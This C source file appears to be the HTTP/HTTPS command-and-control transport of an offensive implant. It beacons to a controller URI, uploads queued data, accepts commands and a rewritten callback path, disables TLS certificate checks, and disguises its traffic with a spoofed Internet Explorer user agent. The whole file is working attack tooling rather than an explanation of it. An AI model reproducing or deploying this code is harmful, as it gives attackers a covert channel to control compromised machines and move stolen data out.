
/**
 * @brief c2_http.c HTTP transport
 * @file c2_http.c
 */

#include <stdbool.h>
#include <stdlib.h>

#include "argv_split.h"
#include "c2.h"
#include "http_client.h"
#include "log.h"
#include "tlv.h"

struct http_ctx {
	struct c2_transport *t;
	char *uri;
	struct ev_timer poll_timer;
	char * headers[2];
	struct http_request_data data;
	struct http_request_opts opts;
	struct buffer_queue *egress;
	int first_packet;
	int in_flight;
	int running;
};

static void patch_uri(struct http_ctx *ctx, struct buffer_queue *q)
{
	struct tlv_packet *request = tlv_packet_read_buffer_queue(q);
	if (request) {
		const char *method = tlv_packet_get_str(request, TLV_TYPE_METHOD);
		const char *new_uri = tlv_packet_get_str(request, TLV_TYPE_TRANS_URL);
		if (strcmp(method, "core_patch_url") == 0 && new_uri) {
			char *old_uri = ctx->uri;
			char *split = ctx->uri;
			for (int i = 0; i < 3; i++) {
				if (split == NULL) {
					break;
				}
				split = strchr(++split, '/');
			}
			if (split) {
				*split = '\0';
			}
			if (asprintf(&ctx->uri, "%s%s", ctx->uri, new_uri) > 0) {
				free(old_uri);
			}
		}
	}
}

static void http_poll_cb(struct http_conn *conn, void *arg)
{
	struct http_ctx *ctx = arg;

	int code = http_conn_response_code(conn);

	if (code > 0) {
		c2_transport_reachable(ctx->t);
	} else {
		c2_transport_unreachable(ctx->t);
	}

	bool got_command = false;
	if (code == 200) {
		struct buffer_queue *q = http_conn_response_queue(conn);
		if (ctx->first_packet) {
			patch_uri(ctx, q);
			ctx->first_packet = 0;
			got_command = true;
		} else {
			size_t len;
			if (buffer_queue_len(q)) {
				got_command = true;
				c2_transport_ingress_queue(ctx->t, q);
			}
		}
	}

	if (got_command) {
		ctx->poll_timer.repeat = 0.01;
	} else {
		if (ctx->poll_timer.repeat < 0.1) {
			ctx->poll_timer.repeat = 0.1;
		} else if (ctx->poll_timer.repeat < 5.0) {
			ctx->poll_timer.repeat += 0.1;
		}
	}

	ctx->in_flight = 0;
}

static void http_poll_timer_cb(struct ev_loop *loop, struct ev_timer *w, int revents)
{
	struct http_ctx *ctx = w->data;
	if (!ctx->in_flight) {
		ctx->in_flight = 1;
		if (buffer_queue_len(ctx->egress) > 0) {
			ctx->data.content_len = buffer_queue_remove_all(ctx->egress,
					&ctx->data.content);
			http_request(ctx->uri, http_request_post, http_poll_cb, ctx,
					&ctx->data, &ctx->opts);
			ctx->data.content_len = 0;
			ctx->data.content = NULL;
		} else {
			http_request(ctx->uri, http_request_get, http_poll_cb, ctx,
					&ctx->data, &ctx->opts);
		}
	}

	if (ctx->running) {
		ev_timer_again(c2_transport_loop(ctx->t), &ctx->poll_timer);
	}
}

void http_ctx_free(struct http_ctx *ctx)
{
	if (ctx) {
		if (ctx->egress) {
			buffer_queue_free(ctx->egress);
		}
		free(ctx->uri);
		free(ctx);
	}
}

int http_transport_init(struct c2_transport *t)
{
	struct http_ctx *ctx = calloc(1, sizeof *ctx);
	if (ctx == NULL) {
		return -1;
	}

	ctx->t = t;
	ctx->uri = strdup(c2_transport_uri(t));
	if (ctx->uri == NULL) {
		goto err;
	}

	ctx->data.content_type = "application/octet-stream";
	ctx->opts.flags = HTTP_OPTS_SKIP_TLS_VALIDATION;

	char *ua = "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko";
	char *args = strchr(ctx->uri, '|');
	if (args) {
		*args = '\0';
		if (strlen(++args)) {
			size_t argc = 0;
			char **argv = argv_split(args, NULL, &argc);
			for (size_t i = 0; i < argc; i++) {
				if (strcmp(argv[i], "--ua") == 0 && argv[i + 1]) {
					ua = argv[i + 1];
				}
			}
		}
	}

	ctx->data.num_headers = 1;
	ctx->headers[0] = strdup("Connection: close");
	if (asprintf(&ctx->headers[ctx->data.num_headers], "User-Agent: %s", ua) > 0) {
		ctx->data.num_headers++;
	}
	ctx->data.headers = ctx->headers;

	ctx->first_packet = 1;

	ev_init(&ctx->poll_timer, http_poll_timer_cb);
	ctx->poll_timer.data = ctx;

	ctx->egress = buffer_queue_new();
	if (ctx->egress == NULL) {
		goto err;
	}

	c2_transport_set_ctx(t, ctx);
	return 0;

err:
	http_ctx_free(ctx);
	return -1;
}

void http_transport_start(struct c2_transport *t)
{
	struct http_ctx *ctx = c2_transport_get_ctx(t);
	ctx->running = 1;
	ctx->poll_timer.repeat = 0.01;
	ev_timer_again(c2_transport_loop(t), &ctx->poll_timer);
}

void http_transport_egress(struct c2_transport *t, struct buffer_queue *egress)
{
	struct http_ctx *ctx = c2_transport_get_ctx(t);
	buffer_queue_move_all(ctx->egress, egress);
}

void http_transport_stop(struct c2_transport *t)
{
	struct http_ctx *ctx = c2_transport_get_ctx(t);
	if (ctx->running) {
		ctx->running = 0;
	}
}

void http_transport_free(struct c2_transport *t)
{
	struct http_ctx *ctx = c2_transport_get_ctx(t);
	buffer_queue_free(ctx->egress);
}

void c2_register_http_transports(struct c2 *c2)
{
	struct c2_transport_cbs http_cbs = {
		.init = http_transport_init,
		.start = http_transport_start,
		.egress = http_transport_egress,
		.stop = http_transport_stop,
		.free = http_transport_free
	};

	c2_register_transport_type(c2, "http", &http_cbs);
	c2_register_transport_type(c2, "https", &http_cbs);
}
